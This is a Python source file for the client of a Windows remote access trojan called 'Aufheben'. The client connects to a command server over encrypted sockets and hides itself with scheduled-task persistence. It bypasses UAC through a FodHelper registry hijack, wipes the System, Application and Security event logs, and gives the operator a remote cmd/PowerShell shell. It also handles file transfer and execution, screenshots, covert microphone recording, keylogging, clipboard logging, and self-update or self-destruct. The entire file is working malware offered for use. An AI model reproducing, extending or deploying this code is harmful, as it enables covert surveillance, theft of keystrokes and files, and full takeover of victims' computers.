import io
import json
import os
import re
import socket
import subprocess
import sys
import threading
import time
import wave
import psutil
import pyaudio
import win32com.client

from ctypes import *
from ctypes.wintypes import *
from datetime import datetime, timedelta
from pathlib import Path
from Crypto.Cipher import AES
from PIL import ImageGrab
from Loggers import KeyLogger, ClipboardLogger

heartbeat_signal = 0xFEEDBEEFFACE
header_size = 6

def clean_input(text):
    non_allowed_char = [{'"': 2}, {"'": 2}]
    non_allowed_text = ['download', 'upload', 'execute', 'search', 'update', 'record_mic']

    for remove in non_allowed_char:
        for item, times in remove.items():
            file_path = text.replace(item, '', times).strip()
            text = file_path
    text = text.split(maxsplit=1)

    if text[0] in non_allowed_text:
        if len(text) > 1:
            return text[1]
        else:
            return ''
    else:
        return text[0]


def param_parser(command):
    flags = []
    argument = command.split()
    for flag in argument[:]:
        if flag.startswith('-'):
            flags.append(flag)
            argument.remove(flag)
    command = ' '.join(argument)
    return flags, command


def buffer_recv_data(sock):
    while True:
        header = b''
        while len(header) < header_size:
            chunk = sock.recv(header_size - len(header))
            if not chunk:
                raise ConnectionError
            header += chunk
        data_length = int.from_bytes(header, 'big')

        if data_length == heartbeat_signal:
            continue

        encrypted_data = b''
        while len(encrypted_data) < data_length:
            encrypted_data += sock.recv(data_length - len(encrypted_data))

        return decrypt(encrypted_data)


def buffer_send_data(data, sock):
    data = data.encode() if isinstance(data, str) else data
    data = encrypt(data)
    header = len(data).to_bytes(header_size, 'big')
    sock.sendall(header + data)


def encrypt(data):
    cipher = AES.new(socket_key, AES.MODE_CTR)
    nonce = cipher.nonce
    encrypted_content = cipher.encrypt(data)
    return nonce + encrypted_content


def decrypt(data):
    nonce = data[:8]
    encrypted_data = data[8:]
    cipher = AES.new(socket_key, AES.MODE_CTR, nonce=nonce)
    decrypted_content = cipher.decrypt(encrypted_data)
    return decrypted_content


# Use the same key as the server
socket_key = b"x\x83\xe1RW\xff\xf1k\xbf\x94\xdef\x88\x8fn\x13:\x9f\xf4\xa5\xf7\x93\xf0l"    # Default key. Place your AES key here 16, 24 or 32 bytes
heartbeat_lock = threading.Lock()


class ClientCore:
    version = '1.0'
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    has_admin_privs = windll.shell32.IsUserAnAdmin()
    recording = threading.Event()
    stop_audio = threading.Event()
    task_name = "Aufheben"
    persistent_exe = None

    def heartbeat(self, sock):
        with heartbeat_lock:
            try:
                while True:
                    header = (heartbeat_signal).to_bytes(header_size, 'big')
                    sock.sendall(header)
                    time.sleep(5)
            except ConnectionError:
                sock.close()
                self.stop_audio.set()
                return
            except OSError:
                return

    def connect_to_server(self):
        while True:
            try:
                self.sock.connect(('127.0.0.1', 80))
                data = buffer_recv_data(self.sock)

                if b'<IniTialiZe>' in data:
                    threading.Thread(target=self.heartbeat, args=(self.sock,), daemon=True).start()
                    self.main_shell()
                    continue

                continue

            except (OSError, ConnectionError):
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            time.sleep(5)

    def migrate(self):
        def check_tasks():
            scheduler = win32com.client.Dispatch('Schedule.Service')
            scheduler.Connect()
            task_folder = scheduler.GetFolder('\\')
            existing_tasks = task_folder.GetTasks(0)

            for task in existing_tasks:
                if task.Name == self.task_name:
                    return True
                else:
                    return False

        def mutex_check():
            CreateMutex = windll.Kernel32.CreateMutexA
            CreateMutex(0, False, b'User_Task5@#')
            return GetLastError()

        if self.has_admin_privs:
            self.persistent_exe = os.path.join(os.environ['TEMP'], f"{self.task_name}.exe")

        else:
            self.persistent_exe = Path(os.environ['USERPROFILE'] + rf'\Desktop\{self.task_name}.exe')

        location = Path(sys.argv[0])

        with open(location, 'rb') as file:
            file_data = file.read()

        if not os.path.isfile(self.persistent_exe):
            with open(self.persistent_exe, 'wb') as file:
                file.write(file_data)

        if not self.has_admin_privs and sys.argv[0] != str(self.persistent_exe) or mutex_check() == 183:
            self.add_persistence()
            sys.exit()

        elif self.has_admin_privs and sys.argv[0] != str(self.persistent_exe):
            self.add_persistence()
            sys.exit()

        elif sys.argv[0] == str(self.persistent_exe) and not check_tasks():
            self.add_persistence()

    def add_persistence(self):
        scheduler = win32com.client.Dispatch('Schedule.Service')
        scheduler.Connect()
        task_folder = scheduler.GetFolder('\\Microsoft') if self.has_admin_privs else scheduler.GetFolder('\\')
        task_definition = scheduler.NewTask(0)
        principal = task_definition.Principal
        settings = task_definition.Settings
        settings.Enabled = True
        settings.StopIfGoingOnBatteries = False
        settings.DisallowStartIfOnBatteries = False
        settings.StartWhenAvailable = True
        reg_info = task_definition.RegistrationInfo
        reg_info.Description = ('Aufheben rat persistence')
        reg_info.Author = 'Mirraisec'

        if not self.has_admin_privs:
            task_definition.Triggers.Create(7)
            trigger = task_definition.Triggers.Create(2)
            start_time = (datetime.now() + timedelta(seconds=5)).strftime("%Y-%m-%dT%H:%M:%S")
            trigger.StartBoundary = start_time
            trigger.Repetition.Interval = "PT5M"

        else:
            task_definition.Triggers.Create(9)
            trigger = task_definition.Triggers.Create(2)
            start_time = (datetime.now() + timedelta(seconds=5)).strftime("%Y-%m-%dT%H:%M:%S")
            trigger.StartBoundary = start_time
            trigger.Repetition.Interval = "PT5M"

        action = task_definition.Actions.Create(0)
        action.Path = str(self.persistent_exe)

        if self.has_admin_privs:
            principal.RunLevel = 1
            task_folder.RegisterTaskDefinition(self.task_name, task_definition, 0x6, "SYSTEM", None, 0)
            self.delete_persistence_task('\\')

        else:
            principal.RunLevel = 0
            task_folder.RegisterTaskDefinition(self.task_name, task_definition, 0x6, None, None, 0)

    def version_control(self, update, self_destruct):
        scheduler = win32com.client.Dispatch('Schedule.Service')
        scheduler.Connect()
        task_folder = scheduler.GetFolder('\\Microsoft') if self.has_admin_privs else scheduler.GetFolder('\\')
        task_definition = scheduler.NewTask(0)
        principal = task_definition.Principal
        settings = task_definition.Settings
        settings.Enabled = True
        settings.StopIfGoingOnBatteries = False
        settings.DisallowStartIfOnBatteries = False
        settings.StartWhenAvailable = True
        reg_info = task_definition.RegistrationInfo
        reg_info.Description = 'Aufheben Self_destruct'
        reg_info.Author = 'Mirralsec'

        if not self.has_admin_privs:
            trigger = task_definition.Triggers.Create(2)
            start_time = (datetime.now() + timedelta(seconds=5)).strftime("%Y-%m-%dT%H:%M:%S")
            trigger.StartBoundary = start_time
            trigger.Repetition.Interval = "PT5M"

        else:
            task_definition.Triggers.Create(9)
            trigger = task_definition.Triggers.Create(2)
            start_time = (datetime.now() + timedelta(seconds=5)).strftime("%Y-%m-%dT%H:%M:%S")
            trigger.StartBoundary = start_time
            trigger.Repetition.Interval = "PT5M"

        action = task_definition.Actions.Create(0)
        action.Path = "cmd"
        if update:
            action.Arguments = rf'/c del {sys.argv[0]} & start "" /min {update} & start "" /min schtasks /delete /tn AufhebenCleanup /f'

        elif self_destruct:
            action.Arguments = rf'/c del {sys.argv[0]} & start "" /min schtasks /delete /tn AufhebenCleanup /f'

        if self.has_admin_privs:
            principal.RunLevel = 1
            task_folder.RegisterTaskDefinition('AufhebenCleanup', task_definition, 0x6, "SYSTEM", None, 0)

        else:
            principal.RunLevel = 0
            task_folder.RegisterTaskDefinition('AufhebenCleanup', task_definition, 0x6, None, None, 0)

    def delete_persistence_task(self, folder):
        scheduler = win32com.client.Dispatch('Schedule.Service')
        scheduler.Connect()

        task_folder = scheduler.GetFolder(folder)
        task_collection = task_folder.GetTasks(0)

        for task in task_collection:
            if task.Name == self.task_name:
                task_folder.DeleteTask(task.Name, 0)

    def updater(self, command):
        destination = os.environ['APPDATA']
        command = Path(clean_input(command))
        uploaded = self.recv_upload(str(command) + ' --HIDE')

        if not uploaded:
            return

        buffer_send_data(b'success', self.sock)
        self.version_control(os.path.join(destination, command.name), False)
        self.delete_persistence_task("\\")
        sys.exit()

    def self_destruct(self, send_confirmation):
        if send_confirmation:
            buffer_send_data(b'[*] Self destruction initiated', self.sock)

        self.version_control(False, True)
        self.delete_persistence_task("\\")
        sys.exit()

    def elevate(self):
        subprocess.run(
            rf'cmd /c REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f &&'
            rf'REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "{self.persistent_exe}" /f &&'
            rf'FodHelper', creationflags=subprocess.CREATE_NO_WINDOW)

        subprocess.run(r'REG DELETE HKCU\Software\Classes\ms-settings\Shell /f',
                       creationflags=subprocess.CREATE_NO_WINDOW)

        if self.elevation_check('\\Microsoft'):
            buffer_send_data(b'valid', self.sock)
            return True

        else:
            buffer_send_data(b'invalid', self.sock)

    def elevation_check(self, folder):
        scheduler = win32com.client.Dispatch('Schedule.Service')
        scheduler.Connect()
        task_folder = scheduler.GetFolder(folder)
        tasks = task_folder.GetTasks(1)

        for task in tasks:
            if task.Name == self.task_name:
                triggers = task.Definition.Triggers
                for trigger in triggers:
                    if trigger.Type == 9:
                        return True

        elevated_path = os.environ['TEMP'] + f"\\{self.task_name}.exe"

        if os.path.isfile(elevated_path):
            return True

    def get_current_user(self):
        WTS_CURRENT_SERVER_HANDLE = 0
        WTSUserName = 5
        session_id = windll.kernel32.WTSGetActiveConsoleSessionId()
        ppBuffer = LPWSTR()
        pBytesReturned = DWORD()

        success = windll.wtsapi32.WTSQuerySessionInformationW(
            WTS_CURRENT_SERVER_HANDLE,
            session_id,
            WTSUserName,
            byref(ppBuffer),
            byref(pBytesReturned)
        )

        if success:
            username = ppBuffer.value
            windll.wtsapi32.WTSFreeMemory(ppBuffer)
            return username

    def stream_recv_data(self, file_path):
        try:
            with open(file_path, 'wb') as file:
                buffer_send_data(b'valid', self.sock)

                while True:
                    data = buffer_recv_data(self.sock)

                    if b'<EOF>' in data:
                        data, _ = data.split(b'<EOF>')
                        file.write(data)
                        return True

                    file.write(data)

        except PermissionError:
            buffer_send_data(b'invalid', self.sock)
            return True

        except ConnectionError:
            return False

    def stream_send_data(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                has_perms = b'valid'
                buffer_send_data(has_perms, self.sock)

                while chunk := file.read(4096):
                    buffer_send_data(chunk, self.sock)
                buffer_send_data(b'<EOF>', self.sock)

        except PermissionError:
            has_perms = b'invalid'
            buffer_send_data(has_perms, self.sock)

    @staticmethod
    def get_external_ip():
        external_ip = b"ip slot here" # IP LOOKUP CODE GOES HERE
        return external_ip

    def check_admin(self):
        if self.has_admin_privs:
            buffer_send_data(b'[+] We admin :)', self.sock)
        else:
            buffer_send_data(b'[-] We no admin :(', self.sock)

    def chdir(self, text):
        try:
            path = text.replace('cd', '').strip()
            os.chdir(path)
            buffer_send_data(b'0', self.sock)

        except PermissionError:
            buffer_send_data(b'1', self.sock)

        except FileNotFoundError:
            buffer_send_data(b'2', self.sock)

    def send_download(self, command):
        path = clean_input(command)
        is_file = b'valid' if os.path.exists(path) else b'invalid'
        buffer_send_data(is_file, self.sock)

        if is_file == b'valid':
            self.stream_send_data(path)

    def recv_upload(self, command):
        isfile = buffer_recv_data(self.sock)

        if isfile == b'valid':
            flags, command = param_parser(command)
            path = clean_input(command)
            filename = Path(path)
            destination = os.path.join(os.environ['APPDATA'],
                                       filename.name) if '--HIDE' in flags else filename.name
            complete = self.stream_recv_data(destination)

            if not complete:
                self.sock.close()
                return False

            if '--cnc' in flags:
                buffer_send_data(b'valid ' + destination.encode(), self.sock)
                return True

            else:
                buffer_send_data(b'valid', self.sock)
                return True

        else:
            return False

    def record_mic(self, command):
        self.recording.set()
        record_seconds = clean_input(command)
        chunk = 1024
        audio_format = pyaudio.paInt16
        channels = 1
        rate = 16000
        wave_output_name = os.environ['LOCALAPPDATA'] + 'Aufheben_audio.dat'

        def save_audio():
            wf = wave.open(wave_output_name, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(audio_format))
            wf.setframerate(rate)
            wf.writeframes(b''.join(frames))
            wf.close()

        def end_stream():
            stream.close()
            p.terminate()
            save_audio()

            try:
                buffer_send_data(b'ready', self.sock)
                self.send_download(wave_output_name)
                os.remove(wave_output_name)

            except OSError:
                subprocess.run(f'cmd /c attrib +h +s {wave_output_name}', creationflags=subprocess.CREATE_NO_WINDOW)

        p = pyaudio.PyAudio()
        frames = []
        stream = p.open(format=audio_format,
                        channels=channels,
                        rate=rate,
                        input=True,
                        frames_per_buffer=chunk)

        if record_seconds:
            if os.path.exists(wave_output_name):
                buffer_send_data(b'exists ' + wave_output_name.encode(), self.sock)
                self.send_download(wave_output_name)
                os.remove(wave_output_name)

            else:
                buffer_send_data(b'not_found', self.sock)

            for i in range(0, int(rate / chunk * int(record_seconds))):
                data = stream.read(chunk)
                frames.append(data)

                if self.stop_audio.is_set():
                    break

            end_stream()

        else:
            return

    def clear_logs(self):
        if self.has_admin_privs:
            buffer_send_data(b'valid', self.sock)
        else:
            buffer_send_data(b'invalid', self.sock)
            return

        logs = ["System", "Application", "Security"]
        for log in logs:
            subprocess.run(f'cmd /c wevtutil cl {log}', creationflags=subprocess.CREATE_NO_WINDOW)

    def search(self, command):
        search_item = clean_input(command).split()

        if len(search_item) < 2:
            return

        is_run = buffer_recv_data(self.sock)

        if is_run == b'valid':
            arguments, directory = search_item
            arguments = arguments.split('.')

            if len(arguments) == 2:
                arguments = f'{arguments[0]}*.{arguments[1]}'
            else:
                arguments = f'*.{arguments[0]}'

            if os.path.isdir(directory):
                isdir = b'valid '
                path = Path(directory)
                results = list(path.rglob(f'{arguments}'))
                results = [str(result) for result in results]
                buffer_send_data(isdir + json.dumps(results).encode(), self.sock)

            else:
                buffer_send_data(b'invalid', self.sock)

    def screenshot(self):
        temp = io.BytesIO()
        screenshot = ImageGrab.grab()
        screenshot.save(temp, 'PNG')
        buffer_send_data(temp.getvalue(), self.sock)

    def process_list(self):
        buffer = ''
        processes = [{'name': p.name(), 'pid': p.pid} for p in psutil.process_iter()]
        sorted_processes = sorted(processes, key=lambda p: p['name'])

        for items in sorted_processes:
            buffer += f'{items.get("pid"):<15}{items.get("name"):<15}\n'
        buffer_send_data(buffer.encode(), self.sock)

    @staticmethod
    def start_logging(send_func, sock, logger):
        t1 = threading.Thread(target=logger.start, args=(send_func, sock), daemon=True)
        t1.start()

    @staticmethod
    def stop_logging(send_func, sock, logger):
        logger.stop(send_func, sock)

    def execute(self, command):
        def deletion_thread(command, process):
            if process:
                process.wait()
                os.remove(command)
            else:
                os.remove(command)

        clean_command = clean_input(command)
        flags, command = param_parser(clean_command)

        if '--DISPLAY' in flags or '--LOG' in flags:
            output = subprocess.run(f'cmd /c "{command}"', capture_output=True,
                                    creationflags=subprocess.CREATE_NO_WINDOW)
            buffer_send_data(output.stdout, self.sock)
            if '--cnc' in flags and '--DELETE' in flags:
                threading.Thread(target=deletion_thread, args=(command, None), daemon=True).start()

        else:
            process = subprocess.Popen(f'cmd /c "{command}"', creationflags=subprocess.CREATE_NO_WINDOW)
            if '--cnc' in flags and '--DELETE' in flags:
                threading.Thread(target=deletion_thread, args=(command, process), daemon=True).start()

    def cmd_shell(self, process):
        def read_output():
            try:
                cmd_delimiter = re.compile(r'^\D:.*')
                powershell_delimiter = re.compile(r'^\D\D \D:.*')
                current_delimiter = cmd_delimiter if process == 'cmd' else powershell_delimiter

                while True:
                    output = cmd.stdout.readline()
                    if cmd.poll() is not None:
                        break

                    elif output and not re.match(current_delimiter, output):
                        buffer_send_data(output.encode(), self.sock)

            except ConnectionError:
                return

        cmd = subprocess.Popen(
            process,
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

        output_thread = threading.Thread(target=read_output, daemon=True)
        output_thread.start()

        try:
            while True:
                command = buffer_recv_data(self.sock).decode()
                if command == 'powershell':
                    cmd.terminate()
                    self.cmd_shell('powershell')
                    return

                elif command == 'cmd':
                    cmd.terminate()
                    self.cmd_shell('cmd')
                    return

                elif command.lower() == 'exit':
                    cmd.terminate()
                    buffer_send_data(b'DONE', self.sock)
                    return

                cmd.stdin.write(f'{command}\n')
                cmd.stdin.flush()

        except ConnectionError:
            return

    def main_shell(self):
        keylogger = KeyLogger()
        cliplogger = ClipboardLogger()

        while True:
            try:
                command = buffer_recv_data(self.sock).decode()

                if command.startswith('initialize_hostname'):
                    buffer_send_data(socket.gethostname(), self.sock)

                elif command.startswith('initialize_get_ip'):
                    buffer_send_data(self.get_external_ip(), self.sock)

                elif command.startswith('initialize_version'):
                    buffer_send_data(self.version.encode(), self.sock)

                elif command.startswith('initialize_current_user'):
                    buffer_send_data(self.get_current_user(), self.sock)

                elif command.startswith('initialize_get_perms'):
                    buffer_send_data(str(self.has_admin_privs).encode(), self.sock)

                elif command.startswith('check_elevation_status'):
                    self.elevate()

                elif command.startswith('cd'):
                    self.chdir(command)
                    continue

                elif command.startswith('exit'):
                    self.sock.close()
                    sys.exit()

                elif command.startswith('pwd'):
                    pwd = os.getcwd()
                    buffer_send_data(pwd.encode(), self.sock)

                elif command.startswith('ls'):
                    dir_list = subprocess.run('cmd /c dir', capture_output=True,
                                              creationflags=subprocess.CREATE_NO_WINDOW).stdout
                    buffer_send_data(dir_list, self.sock)

                elif command.startswith('download'):
                    self.send_download(command)

                elif command.startswith('update'):
                    self.updater(command)

                elif command.startswith('self_destruct'):
                    self.self_destruct(True)

                elif command.startswith('check_version'):
                    buffer_send_data(self.version.encode(), self.sock)

                elif command.startswith('check_priv'):
                    self.check_admin()

                elif command.startswith('clear_logs'):
                    self.clear_logs()

                elif command.startswith('upload'):
                    self.recv_upload(command)

                elif command.startswith('cmd'):
                    self.cmd_shell('cmd')

                elif command.startswith('execute'):
                    self.execute(command)

                elif command.startswith('screenshot'):
                    self.screenshot()

                elif command.startswith('list_proc'):
                    self.process_list()

                elif command.startswith('search'):
                    self.search(command)

                elif command.startswith('persist'):
                    self.add_persistence()

                elif command.startswith('record_mic'):
                    self.record_mic(command)

                elif command.startswith('stop_recording'):
                    if self.recording.is_set():
                        self.recording.clear()

                elif command.startswith('start_keylogger'):
                    self.start_logging(buffer_send_data, self.sock, keylogger)

                elif command.startswith('stop_keylogger'):
                    self.stop_logging(buffer_send_data, self.sock, keylogger)

                elif command.startswith('start_cliplogger'):
                    self.start_logging(buffer_send_data, self.sock, cliplogger)

                elif command.startswith('stop_cliplogger'):
                    self.stop_logging(buffer_send_data, self.sock, cliplogger)

                continue

            except (ConnectionError, OSError):
                self.stop_audio.clear()
                return

    def activate(self):
        self.migrate()
        self.connect_to_server()

def main():
    client = ClientCore()
    client.activate()


if __name__ == '__main__':

    main()
